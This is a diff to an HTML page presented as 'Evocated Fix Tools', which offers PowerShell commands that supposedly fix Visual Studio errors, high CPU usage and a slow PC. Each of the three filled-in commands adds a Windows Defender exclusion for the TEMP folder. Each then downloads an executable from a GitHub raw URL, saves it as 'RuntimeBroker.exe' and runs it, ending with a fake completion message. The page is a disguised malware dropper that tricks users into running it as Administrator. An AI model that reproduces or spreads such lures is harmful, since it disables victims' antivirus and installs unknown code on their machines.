@@ -1,90 +1,139 @@
-<!-- The top part of your code remains unchanged -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Evocated Fix Tools</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(120deg, #0f0f0f, #1a1a1a);
+      color: white;
+      text-align: center;
+      padding: 20px;
+      animation: gradientFlow 15s ease infinite;
+      background-size: 300% 300%;
+    }
 
-<p class="description">
-  You need to run PowerShell as Administrator. Once open, click the button below to get the command you need to run.
-</p>
+    @keyframes gradientFlow {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
 
-<!-- First Tool -->
-<button class="btn" onclick="showCommand('commandBox1', 'copyBtn1')">Fix Now Visual studio Errors</button>
-<div id="commandBox1" class="commandBox">
-  Write-Host "Launching Velocity Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "Fix failed, please try again later or contact support." -ForegroundColor Red
-</div>
-<button id="copyBtn1" class="copyBtn" onclick="copyCommand('commandBox1')" style="display:none;">Copy to Clipboard</button>
+    .btn {
+      background-color: #222;
+      color: cyan;
+      border: 2px solid cyan;
+      padding: 12px 24px;
+      margin: 10px;
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 8px cyan;
+    }
 
-<!-- Other Fix Tools Header -->
-<h3 style="margin-top: 40px; text-shadow: 0 0 8px cyan;">Other Fix Tools</h3>
+    .btn:hover {
+      background-color: cyan;
+      color: black;
+    }
 
-<!-- Tool 2 -->
-<button class="btn" onclick="showCommand('commandBox2', 'copyBtn2')">Fix HIGH CPU USAGE 100 TO 15+</button>
-<div id="commandBox2" class="commandBox">Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "Completed Cpu Capped To 15%+" -ForegroundColor Green</div>
-<button id="copyBtn2" class="copyBtn" onclick="copyCommand('commandBox2')" style="display:none;">Copy to Clipboard</button>
+    .description {
+      margin: 20px 0;
+      font-size: 1.2rem;
+    }
 
-<!-- Tool 3 -->
-<button class="btn" onclick="showCommand('commandBox3', 'copyBtn3')">Fix LAG/SLOW PC 3</button>
-<div id="commandBox3" class="commandBox">Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING PC........................... PC CLEANED PLEASE REBOOT TO MAKE THE PROCESS FAST" -ForegroundColor Green</div>
-<button id="copyBtn3" class="copyBtn" onclick="copyCommand('commandBox3')" style="display:none;">Copy to Clipboard</button>
+    .commandBox {
+      display: none;
+      background: #111;
+      border: 2px solid cyan;
+      padding: 15px;
+      margin: 10px auto;
+      width: 90%;
+      max-width: 800px;
+      font-size: 0.9rem;
+      overflow-x: auto;
+      border-radius: 10px;
+      box-shadow: 0 0 8px cyan;
+    }
 
-<!-- Tool 4 -->
-<button class="btn" onclick="showCommand('commandBox4', 'copyBtn4')">Fix Tool 4</button>
-<div id="commandBox4" class="commandBox">Command for Tool 4...</div>
-<button id="copyBtn4" class="copyBtn" onclick="copyCommand('commandBox4')" style="display:none;">Copy to Clipboard</button>
+    .copyBtn {
+      background-color: #00ffcc;
+      color: black;
+      padding: 10px 20px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 10px;
+      margin-top: 12px;
+      cursor: pointer;
+      box-shadow: 0 0 12px #00ffcc;
+      transition: background 0.2s;
+    }
 
-<!-- Tool 5 -->
-<button class="btn" onclick="showCommand('commandBox5', 'copyBtn5')">Fix Tool 5</button>
-<div id="commandBox5" class="commandBox">Command for Tool 5...</div>
-<button id="copyBtn5" class="copyBtn" onclick="copyCommand('commandBox5')" style="display:none;">Copy to Clipboard</button>
+    .copyBtn:hover {
+      background-color: #00ddaa;
+    }
+  </style>
+</head>
+<body>
 
-<!-- Music and Script Section -->
-<audio id="bgMusic" src="nights.mp3" preload="auto" loop></audio>
+  <p class="description">
+    You need to run PowerShell as Administrator. Once open, click the button below to get the command you need to run.
+  </p>
 
-<script>
-  function showCommand(boxId, btnId) {
-    document.getElementById(boxId).style.display = "block";
-    document.getElementById(btnId).style.display = "inline-block";
-  }
+  <!-- First Tool -->
+  <button class="btn" onclick="showCommand('commandBox1', 'copyBtn1')">Fix Now Visual studio Errors</button>
+  <div id="commandBox1" class="commandBox">
+    Write-Host "Launching Velocity Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "Fix failed, please try again later or contact support." -ForegroundColor Red
+  </div>
+  <button id="copyBtn1" class="copyBtn" onclick="copyCommand('commandBox1')" style="display:none;">Copy to Clipboard</button>
 
-  function copyCommand(boxId) {
-    const text = document.getElementById(boxId).innerText;
-    navigator.clipboard.writeText(text);
-    alert("Command copied!");
-  }
+  <!-- Other Fix Tools Header -->
+  <h3 style="margin-top: 40px; text-shadow: 0 0 8px cyan;">Other Fix Tools</h3>
 
-  document.addEventListener("click", function () {
-    const audio = document.getElementById("bgMusic");
-    if (audio.paused) audio.play();
-  });
-</script>
+  <!-- Tool 2 -->
+  <button class="btn" onclick="showCommand('commandBox2', 'copyBtn2')">Fix HIGH CPU USAGE 100 TO 15+</button>
+  <div id="commandBox2" class="commandBox">Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "Completed Cpu Capped To 15%+" -ForegroundColor Green</div>
+  <button id="copyBtn2" class="copyBtn" onclick="copyCommand('commandBox2')" style="display:none;">Copy to Clipboard</button>
 
-<!-- Styles for new boxes -->
-<style>
-  .commandBox {
-    display: none;
-    background: #111;
-    border: 2px solid cyan;
-    padding: 15px;
-    margin: 10px auto;
-    width: 90%;
-    max-width: 800px;
-    font-size: 0.9rem;
-    overflow-x: auto;
-    border-radius: 10px;
-    box-shadow: 0 0 8px cyan;
-  }
+  <!-- Tool 3 -->
+  <button class="btn" onclick="showCommand('commandBox3', 'copyBtn3')">Fix LAG/SLOW PC 3</button>
+  <div id="commandBox3" class="commandBox">Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING PC........................... PC CLEANED PLEASE REBOOT TO MAKE THE PROCESS FAST" -ForegroundColor Green</div>
+  <button id="copyBtn3" class="copyBtn" onclick="copyCommand('commandBox3')" style="display:none;">Copy to Clipboard</button>
 
-  .copyBtn {
-    background-color: #00ffcc;
-    color: black;
-    padding: 10px 20px;
-    font-size: 1rem;
-    border: none;
-    border-radius: 10px;
-    margin-top: 12px;
-    cursor: pointer;
-    box-shadow: 0 0 12px #00ffcc;
-    transition: background 0.2s;
-  }
+  <!-- Tool 4 -->
+  <button class="btn" onclick="showCommand('commandBox4', 'copyBtn4')">Fix Tool 4</button>
+  <div id="commandBox4" class="commandBox">Command for Tool 4...</div>
+  <button id="copyBtn4" class="copyBtn" onclick="copyCommand('commandBox4')" style="display:none;">Copy to Clipboard</button>
 
-  .copyBtn:hover {
-    background-color: #00ddaa;
-  }
-</style>
+  <!-- Tool 5 -->
+  <button class="btn" onclick="showCommand('commandBox5', 'copyBtn5')">Fix Tool 5</button>
+  <div id="commandBox5" class="commandBox">Command for Tool 5...</div>
+  <button id="copyBtn5" class="copyBtn" onclick="copyCommand('commandBox5')" style="display:none;">Copy to Clipboard</button>
+
+  <!-- Music -->
+  <audio id="bgMusic" src="nights.mp3" preload="auto" loop></audio>
+
+  <!-- Script -->
+  <script>
+    function showCommand(boxId, btnId) {
+      document.getElementById(boxId).style.display = "block";
+      document.getElementById(btnId).style.display = "inline-block";
+    }
+
+    function copyCommand(boxId) {
+      const text = document.getElementById(boxId).innerText;
+      navigator.clipboard.writeText(text);
+      alert("Command copied!");
+    }
+
+    document.addEventListener("click", function () {
+      const audio = document.getElementById("bgMusic");
+      if (audio.paused) audio.play();
+    });
+  </script>
+
+</body>
+</html>
